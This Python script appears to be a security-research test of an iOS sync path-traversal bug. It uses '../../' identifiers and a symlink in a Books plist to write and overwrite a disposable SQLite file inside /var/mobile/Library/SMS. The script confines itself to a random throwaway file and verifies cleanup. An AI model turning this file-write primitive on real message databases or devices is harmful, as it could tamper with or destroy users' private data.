#!/usr/bin/env python3
"""Safely test occupied-destination semantics in /var/mobile/Library/SMS."""

from __future__ import annotations

import asyncio
import hashlib
import json
import os
import posixpath
import secrets
import sqlite3
import tempfile
from pathlib import Path
from typing import Any

import chain_canary as chain
import directory_matrix as matrix


TARGET_DIRECTORY = "/var/mobile/Library/SMS"
AIRLOCK_BOOK_ROOT = "/var/mobile/Media/Airlock/Book"


def sqlite_payload(path: Path, state: str, nonce: str, extra_rows: int) -> bytes:
    connection = sqlite3.connect(path)
    try:
        connection.execute("PRAGMA journal_mode=DELETE")
        connection.execute("PRAGMA secure_delete=ON")
        connection.execute("CREATE TABLE marker (id INTEGER PRIMARY KEY, state TEXT, nonce TEXT)")
        connection.execute(
            "INSERT INTO marker(state, nonce) VALUES (?, ?)", (state, nonce)
        )
        for index in range(extra_rows):
            connection.execute(
                "INSERT INTO marker(state, nonce) VALUES (?, ?)",
                (f"{state}-{index}", f"{nonce}-{index}-" + ("x" * 256)),
            )
        connection.execute(f"PRAGMA user_version={1 if state == 'preimage' else 2}")
        connection.commit()
    finally:
        connection.close()
    return path.read_bytes()


def attempt_names() -> tuple[str, str, str]:
    token = secrets.token_hex(8)
    return (
        f"codex-dir-src-24A435-{token}",
        f"codex-dir-link-24A435-{token}",
        f"codex-dir-recovered-24A435-{token}",
    )


async def stage_inputs(
    udid: str,
    source: str,
    link_destination: str,
    recovered: str,
    archive: bytes,
    books: bytes,
    work: Path,
) -> dict[str, Any]:
    archive_path = work / f"{source}.zip"
    books_path = work / f"{source}-Books.plist"
    archive_path.write_bytes(archive)
    books_path.write_bytes(books)
    return await asyncio.to_thread(
        chain.run_mobiledevice_io,
        "stage",
        udid,
        source,
        link_destination,
        recovered,
        os.fspath(archive_path),
        os.fspath(books_path),
    )


async def create_disposable_preimage(
    udid: str,
    target_leaf: str,
    preimage: bytes,
    expected_path: Path,
    work: Path,
) -> dict[str, Any]:
    source, link_destination, unused_recovery = attempt_names()
    archive, target_tail = matrix.build_matrix_archive(TARGET_DIRECTORY, preimage)
    link_identifier = f"../../{source}/p0/p1/p2/link"
    payload_identifier = f"../../{source}/payload"
    payload_destination = f"{link_destination}/{target_leaf}"
    books = chain.build_books_plist(link_identifier, payload_identifier)
    result: dict[str, Any] = {}
    result["stage"] = await stage_inputs(
        udid,
        source,
        link_destination,
        unused_recovery,
        archive,
        books,
        work,
    )
    if not result["stage"].get("operation", {}).get("ok"):
        raise RuntimeError("disposable preimage staging failed")
    result["atc"] = await asyncio.to_thread(
        chain.run_atc_host,
        udid,
        link_identifier,
        link_destination,
        payload_identifier,
        payload_destination,
    )
    result["preCollisionRead"] = await asyncio.to_thread(
        chain.run_mobiledevice_io,
        "read-disposable-through-link",
        udid,
        f"{link_destination}/{target_leaf}",
        os.fspath(expected_path),
    )
    result["preCollisionReadExact"] = bool(
        result["preCollisionRead"].get("targetGatePassed")
        and result["preCollisionRead"].get("operation", {}).get("ok")
    )
    result["generatedCleanup"] = await asyncio.to_thread(
        chain.run_mobiledevice_io,
        "verify-matrix-cleanup",
        udid,
        source,
        link_destination,
        unused_recovery,
        os.fspath(expected_path),
        target_tail,
    )
    operation = result["generatedCleanup"].get("operation", {})
    result["generatedCleanupComplete"] = matrix.cleanup_is_complete(operation)
    return result


async def collide_and_recover(
    udid: str,
    target_leaf: str,
    replacement: bytes,
    preimage_path: Path,
    replacement_path: Path,
    work: Path,
    *,
    recovery_only: bool = False,
) -> dict[str, Any]:
    source, link_destination, recovered = attempt_names()
    archive, target_tail = matrix.build_matrix_archive(TARGET_DIRECTORY, replacement)
    link_identifier = f"../../{source}/p0/p1/p2/link"
    target_path = f"{TARGET_DIRECTORY}/{target_leaf}"
    target_identifier = posixpath.relpath(target_path, AIRLOCK_BOOK_ROOT)
    if recovery_only:
        books = chain.build_books_plist(link_identifier, target_identifier)
    else:
        payload_identifier = f"../../{source}/payload"
        books = chain.build_books_plist(
            link_identifier, payload_identifier, target_identifier
        )

    result: dict[str, Any] = {"recoveryOnly": recovery_only}
    result["stage"] = await stage_inputs(
        udid,
        source,
        link_destination,
        recovered,
        archive,
        books,
        work,
    )
    if not result["stage"].get("operation", {}).get("ok"):
        raise RuntimeError("collision/recovery staging failed")
    if recovery_only:
        result["atc"] = await asyncio.to_thread(
            chain.run_atc_host,
            udid,
            link_identifier,
            link_destination,
            target_identifier,
            recovered,
        )
    else:
        result["atc"] = await asyncio.to_thread(
            chain.run_atc_host,
            udid,
            link_identifier,
            link_destination,
            payload_identifier,
            f"{link_destination}/{target_leaf}",
            target_identifier,
            recovered,
        )
    result["verifyCleanup"] = await asyncio.to_thread(
        chain.run_mobiledevice_io,
        "verify-matrix-collision-cleanup",
        udid,
        source,
        link_destination,
        recovered,
        os.fspath(preimage_path),
        os.fspath(replacement_path),
        target_tail,
    )
    operation = result["verifyCleanup"].get("operation", {})
    result["recoveredPreimageExact"] = bool(
        operation.get("recoveredPresent")
        and operation.get("recoveredBytesMatch")
    )
    result["recoveredReplacementExact"] = bool(
        operation.get("recoveredPresent")
        and operation.get("recoveredAlternateBytesMatch")
    )
    result["cleanupComplete"] = matrix.cleanup_is_complete(operation)
    return result


async def main() -> int:
    udid = chain.TRANSPORT.paired_coredevice_udid()
    target_leaf = f"codex-disposable-messages-{secrets.token_hex(16)}.sqlite"
    result: dict[str, Any] = {
        "schema": 1,
        "test": "ATCStreamingZipDisposableMessagesSQLiteCollision",
        "targetDirectory": TARGET_DIRECTORY,
        "targetLeaf": target_leaf,
        "liveMessagesDatabaseTouched": False,
        "existingUserFileTargeted": False,
    }
    with tempfile.TemporaryDirectory(prefix="sms-disposable-collision-") as work_dir:
        work = Path(work_dir)
        preimage_path = work / "preimage.sqlite"
        replacement_path = work / "replacement.sqlite"
        preimage = sqlite_payload(
            preimage_path, "preimage", secrets.token_hex(24), extra_rows=0
        )
        replacement = sqlite_payload(
            replacement_path, "replacement", secrets.token_hex(24), extra_rows=40
        )
        result["preimageLength"] = len(preimage)
        result["replacementLength"] = len(replacement)
        result["preimageSHA256"] = hashlib.sha256(preimage).hexdigest()
        result["replacementSHA256"] = hashlib.sha256(replacement).hexdigest()
        try:
            result["preflight"] = await matrix.preflight(udid)
            result["creationControl"] = await create_disposable_preimage(
                udid, target_leaf, preimage, preimage_path, work
            )
            if not result["creationControl"].get("generatedCleanupComplete"):
                raise RuntimeError("creation-control generated cleanup failed")
            result["creationControlRecovery"] = await collide_and_recover(
                udid,
                target_leaf,
                replacement,
                preimage_path,
                replacement_path,
                work,
                recovery_only=True,
            )
            if not (
                result["creationControlRecovery"].get("cleanupComplete")
                and result["creationControlRecovery"].get(
                    "recoveredPreimageExact"
                )
            ):
                raise RuntimeError("creation control was not recovered exactly")
            result["occupiedCreation"] = await create_disposable_preimage(
                udid, target_leaf, preimage, preimage_path, work
            )
            if not result["occupiedCreation"].get("generatedCleanupComplete"):
                raise RuntimeError("occupied-creation generated cleanup failed")
            result["collision"] = await collide_and_recover(
                udid,
                target_leaf,
                replacement,
                preimage_path,
                replacement_path,
                work,
            )
            collision = result["collision"]
            if not collision.get("cleanupComplete"):
                raise RuntimeError("collision cleanup failed")
            if not (
                collision.get("recoveredPreimageExact")
                or collision.get("recoveredReplacementExact")
            ):
                result["dedicatedRecovery"] = await collide_and_recover(
                    udid,
                    target_leaf,
                    replacement,
                    preimage_path,
                    replacement_path,
                    work,
                    recovery_only=True,
                )
                if not result["dedicatedRecovery"].get("cleanupComplete"):
                    raise RuntimeError("dedicated recovery cleanup failed")
            result["postflight"] = await matrix.preflight(udid)
        except Exception as error:
            result["errorType"] = type(error).__name__
            result["error"] = chain.TRANSPORT.redact(error)

    observations = [result.get("collision", {}), result.get("dedicatedRecovery", {})]
    recovered_preimage = any(row.get("recoveredPreimageExact") for row in observations)
    recovered_replacement = any(
        row.get("recoveredReplacementExact") for row in observations
    )
    pre_collision_read_exact = bool(
        result.get("occupiedCreation", {}).get("preCollisionReadExact")
    )
    creation_control_exact = bool(
        result.get("creationControlRecovery", {}).get(
            "recoveredPreimageExact"
        )
    )
    occupied_creation_dispatched = bool(
        result.get("occupiedCreation", {}).get("stage", {})
        .get("operation", {})
        .get("ok")
        and result.get("occupiedCreation", {}).get("atc", {}).get("ok")
        and result.get("occupiedCreation", {}).get("generatedCleanupComplete")
    )
    result["creationControlRecoveredExact"] = creation_control_exact
    result["occupiedCreationDispatched"] = occupied_creation_dispatched
    result["preimagePresentBeforeCollision"] = pre_collision_read_exact
    result["preimageCreationProven"] = creation_control_exact
    result["directOccupiedDestinationOverwrite"] = bool(
        creation_control_exact
        and occupied_creation_dispatched
        and recovered_replacement
    )
    result["directCollisionRejected"] = bool(
        creation_control_exact
        and occupied_creation_dispatched
        and recovered_preimage
        and not recovered_replacement
    )
    result["allGeneratedArtifactsAccountedFor"] = bool(
        result.get("creationControl", {}).get("generatedCleanupComplete")
        and result.get("creationControlRecovery", {}).get("cleanupComplete")
        and result.get("occupiedCreation", {}).get("generatedCleanupComplete")
        and all(
            row.get("cleanupComplete")
            for row in observations
            if row
        )
        and (recovered_preimage or recovered_replacement)
    )
    result["ok"] = bool(
        "error" not in result
        and result["preimageCreationProven"]
        and result["allGeneratedArtifactsAccountedFor"]
    )
    public = {
        "ok": result["ok"],
        "targetDirectory": result["targetDirectory"],
        "targetLeaf": result["targetLeaf"],
        "liveMessagesDatabaseTouched": result["liveMessagesDatabaseTouched"],
        "existingUserFileTargeted": result["existingUserFileTargeted"],
        "preimageLength": result["preimageLength"],
        "replacementLength": result["replacementLength"],
        "preimageCreationProven": result["preimageCreationProven"],
        "creationControlRecoveredExact": result[
            "creationControlRecoveredExact"
        ],
        "occupiedCreationDispatched": result["occupiedCreationDispatched"],
        "preimagePresentBeforeCollision": result[
            "preimagePresentBeforeCollision"
        ],
        "directOccupiedDestinationOverwrite": result[
            "directOccupiedDestinationOverwrite"
        ],
        "directCollisionRejected": result["directCollisionRejected"],
        "allGeneratedArtifactsAccountedFor": result[
            "allGeneratedArtifactsAccountedFor"
        ],
        "booksSyncPlistPresentAfter": result.get("postflight", {})
        .get("operation", {})
        .get("booksSyncPlistPresent"),
        "error": result.get("error"),
    }
    print(json.dumps(public, sort_keys=True), flush=True)
    return 0 if result["ok"] else 2


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
